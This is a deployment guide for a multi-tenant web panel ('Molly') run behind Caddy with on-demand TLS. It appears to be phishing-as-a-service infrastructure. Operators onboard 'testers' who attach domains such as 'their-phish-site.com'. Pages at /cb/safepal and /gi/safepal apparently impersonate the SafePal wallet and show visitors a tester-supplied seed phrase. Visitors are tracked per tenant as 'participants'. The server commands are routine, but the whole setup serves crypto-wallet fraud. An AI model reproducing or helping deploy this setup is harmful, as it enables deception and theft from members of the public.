# Deploying the panel on an RDP / VPS

This app is a TanStack Start server. Run it on your RDP (Windows: use WSL2
Ubuntu; Linux VPS: use it directly) as a normal Bun process behind a Caddy
reverse proxy. Any hostname the reverse proxy forwards to the app becomes a
"tester domain" as soon as a tester attaches it in Settings → My domains —
the app resolves the tenant from the incoming `Host` header, so no
per-domain config file is needed.

The server's public IP is stored **in the database**, not in a config file.
The admin edits it inside the panel at **Settings → My domains → Edit IP**,
and every tester's "Add domain" dialog shows that IP as the A record value
they should point their DNS at. The IP defaults to `0.0.0.0` until an admin
sets it.

Only the accounts you create in the admin panel can sign in — public
sign-ups are locked as soon as the first admin exists.

---

## 1. Prerequisites

- Ubuntu 22.04+ (WSL2 on Windows Server is fine).
- A domain you control for the panel itself, e.g. `panel.example.com`.
- The **public IPv4** of the RDP (whatever the internet routes to it).
- Ports **80** and **443** open in: the RDP firewall, Windows Defender,
  your cloud provider's security group. Port **22** open for SSH.
- Install once:
  ```bash
  sudo apt update
  sudo apt install -y curl git ufw fail2ban unzip debian-keyring debian-archive-keyring apt-transport-https
  curl -fsSL https://bun.sh/install | bash
  # log out / back in so ~/.bun/bin is on PATH

  # Caddy — handles TLS + on-demand certs automatically
  curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' \
    | sudo gpg --dearmor -o /usr/share/keyrings/caddy.gpg
  echo "deb [signed-by=/usr/share/keyrings/caddy.gpg] https://dl.cloudsmith.io/public/caddy/stable/deb/debian any-version main" \
    | sudo tee /etc/apt/sources.list.d/caddy.list
  sudo apt update && sudo apt install -y caddy
  ```

## 2. Get the code + build

```bash
cd /opt
sudo git clone <YOUR REPO URL> panel
sudo chown -R $USER:$USER panel
cd panel
bun install
bun run build
```

## 3. Environment

Create `/opt/panel/.env.production`:

```
SUPABASE_URL=https://<your-project>.supabase.co
SUPABASE_PUBLISHABLE_KEY=<publishable key>
SUPABASE_SERVICE_ROLE_KEY=<service role key>
VITE_SUPABASE_URL=https://<your-project>.supabase.co
VITE_SUPABASE_PUBLISHABLE_KEY=<publishable key>
SESSION_SECRET=<32+ char random string: openssl rand -hex 32>
NODE_ENV=production
PORT=3000
# Panel hostname — used to refuse on-demand cert issuance for the panel's
# own host (Caddy handles that with regular auto-TLS instead).
PANEL_HOST=panel.example.com
```

`chmod 600 .env.production`. Never commit it.

**Note:** you do NOT need to set `SERVER_PUBLIC_IP` here anymore. The
admin sets it inside the panel (Settings → My domains → Edit IP) after
first login. `.env` values are used only as a fallback if the DB value
is empty.

## 4. Run under systemd

```bash
sudo tee /etc/systemd/system/panel.service <<'EOF'
[Unit]
Description=Molly panel
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/panel
EnvironmentFile=/opt/panel/.env.production
ExecStart=/home/YOURUSER/.bun/bin/bun run start
Restart=always
RestartSec=3
User=YOURUSER

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now panel
sudo systemctl status panel
```

## 5. Caddy reverse proxy (auto-TLS + on-demand TLS)

Write `/etc/caddy/Caddyfile`:

```caddy
{
    # Ask the panel before issuing a cert for any unknown hostname.
    on_demand_tls {
        ask http://127.0.0.1:3000/api/public/caddy-ask
    }
    email you@example.com
}

# --- Panel host: regular auto-TLS (control panel ONLY here) ---
ilovemolly.com, www.ilovemolly.com {
    reverse_proxy 127.0.0.1:3000
}

# --- Every tester-attached domain: on-demand TLS ---
:443 {
    tls {
        on_demand
    }

    # Control panel paths are panel-host only — refuse from tester domains.
    @panel_paths path /panel* /admin* /auth* /observe*
    respond @panel_paths 404

    reverse_proxy 127.0.0.1:3000
}

:80 {
    redir https://{host}{uri} permanent
}
```

Load it:

```bash
sudo systemctl enable --now caddy
sudo systemctl reload caddy
sudo journalctl -u caddy -f
```

## 6. Firewall

```bash
sudo ufw allow OpenSSH
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw --force enable
sudo systemctl enable --now fail2ban
```

Disable SSH password auth once your key is in `~/.ssh/authorized_keys`
(edit `/etc/ssh/sshd_config` → `PasswordAuthentication no`, then
`sudo systemctl restart ssh`).

## 7. First admin + configure the server IP

1. Point `panel.example.com` DNS `A` record → your RDP's public IP.
2. Visit `https://panel.example.com/auth`. Because zero admins exist, the
   form is in **setup** mode — pick your admin username + a strong
   password. Setup locks itself as soon as the first admin is created.
3. Sign in → `/admin` → **Settings → My domains**.
4. The IP box shows **0.0.0.0** initially. Click **Edit IP**, paste your
   RDP's public IP, click **Save**. Every tester now sees that IP in
   their own "Add domain" panel.

## 8. Onboarding testers

1. Admin: **Settings → Accounts → Create account**, role = Tester.
   Repeat for each tester. Share credentials out-of-band.
2. Tester signs in → **Settings → My domains** → types their hostname
   (e.g. `their-phish-site.com`) → **Add domain**.
3. Tester copies the IP from the box, opens their registrar, sets
   `A @ → <that IP>`.
4. Tester clicks **Recheck**; the DNS badge flips to green within a
   minute of propagation.
5. Tester opens `https://their-phish-site.com` in a private tab. First
   hit takes ~2–5s while Caddy issues the cert; SSL badge flips to green
   on the next Recheck.
6. Tester goes to **Settings → My seed phrase**, pastes their 12/24-word
   phrase. Every visitor on their domains now sees that phrase on
   `/cb/safepal` and `/gi/safepal`, and only that tester sees those
   participants in `/admin`.

## 9. Ongoing

- Update the app: `cd /opt/panel && git pull && bun install && bun run build && sudo systemctl restart panel`
- Logs: `sudo journalctl -u panel -f`, `sudo journalctl -u caddy -f`
- Change server IP later (e.g. you migrated hosts): admin → Settings →
  My domains → **Edit IP**. No SSH, no config edit.
- Rotate a leaked tester password: admin → Settings → Accounts → Edit.
  The old session is kicked automatically.

---

## Isolation model (how testers stay separated)

- **`tenant_domains`** maps `hostname → owner_id`. The first heartbeat
  from a visitor resolves the `Host` header against this table and
  stamps `participants.owner_id` — permanent.
- **`/admin` participants list** is filtered by `owner_id = auth.uid()`
  server-side, unless the caller is an admin (who sees all).
- **`/cb/safepal` seed phrase** is fetched by `resolveTenantByHost`; an
  unattached hostname shows the default placeholder.
- **Server IP** lives in `app_settings.server_public_ip` (JSON), edited
  through the admin UI. `SERVER_PUBLIC_IP` env var is only a fallback.
- **Sign-in** goes through Supabase Auth with synthetic
  `<username>@molly.local` emails; `/auth` refuses new sign-ups once any
  admin exists.
- **Admin sessions** are unlimited-device; tester sessions are
  single-session (a second sign-in kicks the first).
